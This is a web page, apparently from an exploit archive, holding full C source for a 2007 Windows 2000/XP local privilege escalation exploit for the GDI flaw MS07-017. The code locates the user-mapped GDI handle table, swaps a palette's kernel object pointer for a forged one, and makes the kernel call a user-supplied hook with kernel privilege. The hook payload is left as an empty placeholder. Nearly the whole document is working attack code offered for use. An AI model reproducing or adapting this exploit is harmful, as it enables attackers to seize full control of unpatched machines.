<html><head><title>MS Windows GDI Local Privilege Escalation Exploit (MS07-017) 2</title></head><pre>/*
GDI Local Elevation of Privilege Vulnerability Exploit (MS07-017)

Coded by Lionel d'Hauenens 
http://www.labo-asso.com

Development:
------------
Dev-C++ 4.9.9.2
Linked with /lib/libgdi32.a 

References:
-----------
http://www.microsoft.com/technet/security/bulletin/MS07-017.mspx
http://research.eeye.com/html/alerts/zeroday/20061106.html
http://www.milw0rm.com/exploits/3688 
http://ivanlef0u.free.fr/?p=41

March 16, 2007
*/

#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;windows.h&gt; 

typedef enum _SECTION_INFORMATION_CLASS
{
    SectionBasicInformation,
    SectionImageInformation
} SECTION_INFORMATION_CLASS;  
                                                
typedef struct _SECTION_BASIC_INFORMATION {
  ULONG                   Base;
  ULONG                   Attributes;
  LARGE_INTEGER           Size;
} SECTION_BASIC_INFORMATION;

typedef struct _GDI_TABLE_ENTRY
{
   PVOID pKernelInfo;
   WORD  ProcessID; 
   WORD  _nCount;
   WORD  nUpper;
   BYTE  nType;
   BYTE  flags;
   PVOID pUserInfo;
} GDI_TABLE_ENTRY, *PGDI_TABLE_ENTRY;

typedef DWORD (WINAPI* NTQUERYSECTION)(HANDLE, ULONG, PVOID,ULONG,PULONG);  
NTQUERYSECTION NtQuerySection;                                              

#define INT3 asm (&quot;.intel_syntax noprefix&quot;); __asm (&quot;int 3&quot;); asm (&quot;.att_syntax noprefix&quot;);
#define STATUS_SUCCESS 0
#define PAL_TYPE 8
    
DWORD flag_test;

hook (HANDLE pal, COLORREF couleur)
{
     // INT3
     // Executed code with kernel privilege
     asm (&quot;.intel_syntax noprefix&quot;);
         __asm (&quot;cli&quot;);
         
         // it's the fiesta !!! :)                 
         
         __asm (&quot;sti&quot;);         
     asm (&quot;.att_syntax noprefix&quot;);
     
     flag_test = 1;      
     
     return (TRUE);     
} 

int main(int argc, char *argv[])
{    
    SECTION_BASIC_INFORMATION SectionInfo;    
    PGDI_TABLE_ENTRY pGdiEntry;
    PLOGPALETTE pLogPal;
    HANDLE hPal;
    PVOID OriginalPalObject;
    PVOID FalsePalObject; 
       
    HANDLE hThread = GetCurrentThread();  
    DWORD OriginalThreadPriotity = GetThreadPriority (hThread);  
    HANDLE hSection = (ULONG)0;  
    PVOID MapFile = 0;
    HANDLE hProcess = (HANDLE)0xFFFFFFFF;
    WORD Pid = GetCurrentProcessId();                 
                  
   	NtQuerySection = (NTQUERYSECTION)GetProcAddress(LoadLibrary( &quot;ntdll.dll&quot;),&quot;NtQuerySection&quot;);
         
    printf (&quot;##########################################################\n&quot;);                
    printf (&quot;# GDI Local Elevation of Privilege Vulnerability Exploit #\n&quot;);
    printf (&quot;#        All Windows 2000/XP before MS07-017 patch       #\n&quot;);
    printf (&quot;##########################################################\n&quot;);   
    printf (&quot;# coded by Lionel d'Hauenens   http://www.labo-asso.com  #\n&quot;);
    printf (&quot;##########################################################\n\n&quot;);                                     
                                                      
    // Search handle section and mapper in virtual memory of user
    while ((DWORD)hSection&lt;0xFFFF) 
    {
        SectionInfo.Attributes = 0;  
        MapFile = MapViewOfFile((HANDLE)hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0); 
        if (MapFile)
        {
            NtQuerySection((HANDLE)hSection,0,&amp;SectionInfo,sizeof(SectionInfo),0);
            if (SectionInfo.Attributes == SEC_COMMIT) break;  // For compatibility with win2k 
            UnmapViewOfFile(MapFile); 
            MapFile = 0;
        }                
        hSection++;
    }

    if (!MapFile)
    {
       printf (&quot;Could not found shared section !\n&quot;);
       exit(0);             
    }              

    // Create Palette
    pLogPal = (PLOGPALETTE) calloc (sizeof(LOGPALETTE)+sizeof(PALETTEENTRY), 1);    
    pLogPal-&gt;palNumEntries = 1;
    pLogPal-&gt;palVersion = 0x300;
    hPal = (HANDLE)CreatePalette(pLogPal);  
    
    if (!hPal)
    {
       printf (&quot;Could not create palette !\n&quot;);
       exit(0);             
    }      
    
    // Search the entry of pal object 
    OriginalPalObject = (PVOID)0;        
    pGdiEntry = (PGDI_TABLE_ENTRY)MapFile;
    while ((DWORD)pGdiEntry &lt; ((DWORD)MapFile) + SectionInfo.Size.QuadPart)
    {
          if ( pGdiEntry-&gt;ProcessID == Pid  &amp;&amp;
                  pGdiEntry-&gt;nType == PAL_TYPE )
          {
              // Save original pointer
              OriginalPalObject =  (PVOID)pGdiEntry-&gt;pKernelInfo;                          
              break;
          }           
          pGdiEntry++;          
    }

    if (!OriginalPalObject)
    {
       printf (&quot;Could not find entry of Pal object !\n&quot;);
       exit(0);                  
    }  
    
    // Create the false Pal object
    FalsePalObject                   = (PVOID) calloc(0x100/4,4);
    ((PDWORD)FalsePalObject)[0]      = (DWORD)hPal;   // Handle    
    ((PDWORD)FalsePalObject)[0x14/4] = (DWORD) 1;     // Availabled flag
    ((PVOID*)FalsePalObject)[0x3C/4] = (PVOID) &amp;hook; // Interface GetNearestPaletteIndex 
  
    printf (&quot;Section:\n--------\n&quot;);                                                             
    printf (&quot;Handle: 0x%08X    Attributes: %08X    Size: 0x%08X\n\n&quot;, hSection
                                                                    , SectionInfo.Attributes
                                                                    , SectionInfo.Size.QuadPart);
    printf (&quot;Pointer of original pal object: 0x%08X\n&quot;, OriginalPalObject); 
    printf (&quot;Address of user map: 0x%08X\n&quot;, MapFile); 
    printf (&quot;Pointer of false pal object: 0x%08X\n&quot;, FalsePalObject);  
    printf (&quot;Entry of GDI palette in user view: 0x%08X\n&quot;, MapFile+((((ULONG)hPal) &amp; 0xFFFF)*sizeof(GDI_TABLE_ENTRY)) );     
    printf (&quot;Address of Hook(): 0x%08X\n\n&quot;, &amp;hook);  

    //////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////  
    printf (&quot;-&gt;Test...&quot;);
    flag_test = 0;            
    SetThreadPriority (hThread, THREAD_PRIORITY_HIGHEST); 
         
         // Active false Pal object    
         pGdiEntry-&gt;pKernelInfo = FalsePalObject;   
                 
              GetNearestPaletteIndex (hPal, 0); //--&gt; call hook() with kernel privilege :);
             
         // Restore original Pal object
         pGdiEntry-&gt;pKernelInfo = OriginalPalObject; 
    
    SetThreadPriority (hThread,OriginalThreadPriotity);
    //////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////
    
    if (!flag_test) printf (&quot;ERROR !!!\n&quot;);
    else printf (&quot;OK :)\n&quot;);

    UnmapViewOfFile(MapFile);
    DeleteObject ((HANDLE)hPal);
    free((PVOID)pLogPal);
    free((PVOID)FalsePalObject);  
    system(&quot;PAUSE&quot;);          
    return (0);         
}

// milw0rm.com [2007-04-17]</pre></html>